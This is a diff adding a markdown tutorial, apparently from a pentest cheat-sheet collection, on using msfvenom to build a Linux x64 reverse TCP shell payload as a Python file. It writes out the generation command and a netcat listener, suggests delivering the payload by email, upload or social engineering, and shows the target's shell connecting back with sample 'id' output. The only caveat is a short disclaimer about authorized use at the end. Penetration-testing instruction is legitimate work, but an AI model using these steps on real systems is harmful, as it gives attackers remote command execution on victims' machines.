@@ -1,0 +1,150 @@
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> msfvenom is a versatile command-line tool that comes bundled with Metasploit, a popular penetration testing framework. The specific command in question, 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py', is used to generate a reverse shell payload in Python format that targets a 64-bit Linux system.
+> 
+
+### 🧐 Why ?
+
+> Understanding this command is crucial for both penetration testers and system administrators. For penetration testers, this knowledge helps in exploiting poorly secured systems by generating a payload that, when executed on the target system, provides a reverse shell to the attacker. For system administrators, understanding these methods is essential to better secure their systems and to identify malicious activities.
+> 
+
+### ⛏️ How ?
+
+> To use this command, you need to have Metasploit installed on your system. The '-p' switch specifies the payload type, in this case, a reverse TCP shell for a 64-bit Linux system. The 'LHOST' and 'LPORT' are the IP address and port on which the attacker's machine is listening. The '-f py' switch specifies the output format, Python in this case. The '-o revshell.py' switch writes the output payload to a file named 'revshell.py'.
+> 
+
+### ⏳ When ?
+
+> The use of reverse shell payloads became prominent with the rise in popularity of penetration testing and ethical hacking. The 'msfvenom' tool and similar technologies have been in use for over a decade, aiding both attackers and defenders in their respective tasks.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+### Overview
+
+A reverse shell is a type of shell where the target machine initiates a connection back to the attacker’s machine. This allows the attacker to bypass firewalls and NAT, as the outbound connection from the target machine is often not blocked.
+
+Using `msfvenom`, part of the Metasploit Framework, you can create a reverse shell payload that can be executed on a target machine. Here's a step-by-step guide on how to create, deploy, and interact with a reverse shell payload.
+
+### Steps to Create a Reverse Shell Payload Using Msfvenom
+
+### 1. Install Metasploit Framework
+
+Metasploit is essential for generating payloads and performing various exploitation tasks. Install it using the following command:
+
+```bash
+sudo apt-get install metasploit-framework
+
+```
+
+### 2. Generate the Reverse Shell Payload
+
+Use `msfvenom` to generate a payload. The following command creates a reverse TCP shell payload for a 64-bit Linux system, outputting the payload as a Python script.
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f py -o revshell.py
+
+```
+
+Explanation:
+
+- `p linux/x64/shell_reverse_tcp`: Specifies the payload type.
+- `LHOST=192.168.1.10`: IP address of the attacker's machine.
+- `LPORT=4444`: Port on which the attacker’s machine will listen.
+- `f py`: Output format is Python.
+- `o revshell.py`: Output file name.
+
+### 3. Start a Listener on the Attacker’s Machine
+
+Use `netcat` (nc) to start a listener on the specified port. This will wait for the connection from the target machine.
+
+```bash
+nc -nvlp 4444
+
+```
+
+Explanation:
+
+- `n`: Numeric-only IP addresses (no DNS).
+- `v`: Verbose mode, provides more details.
+- `l`: Listen mode, for incoming connections.
+- `p 4444`: Port number to listen on.
+
+### 4. Transfer and Execute the Payload on the Target Machine
+
+Transfer the generated `revshell.py` payload to the target machine through various means (e.g., email, file upload, social engineering).
+
+On the target machine, execute the payload:
+
+```bash
+python revshell.py
+
+```
+
+### Example Workflow
+
+### 1. Generate the Payload
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f py -o revshell.py
+
+```
+
+**Output**:
+
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 123 bytes
+Final size of py file: 615 bytes
+Saved as: revshell.py
+
+```
+
+### 2. Start the Listener
+
+```bash
+nc -nvlp 4444
+
+```
+
+**Output**:
+
+```
+Listening on [0.0.0.0] (family 0, port 4444)
+
+```
+
+### 3. Execute the Payload on Target Machine
+
+Transfer `revshell.py` to the target machine and execute it:
+
+```bash
+python revshell.py
+
+```
+
+**Listener Output**:
+
+```
+Connection received on 192.168.1.20 12345
+id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
+```
+
+You now have a reverse shell, allowing you to execute commands on the target machine as if you were directly interacting with it.
+
+### Conclusion
+
+A reverse shell allows attackers to gain remote access to a target machine by having it initiate a connection back to the attacker’s machine. Using `msfvenom`, a payload can be generated and deployed to achieve this. It’s crucial to understand that such actions should only be performed in authorized environments, such as penetration testing labs, and always with permission from the system owner. This knowledge helps both security professionals in understanding potential attack vectors and system administrators in securing their systems against such attacks.
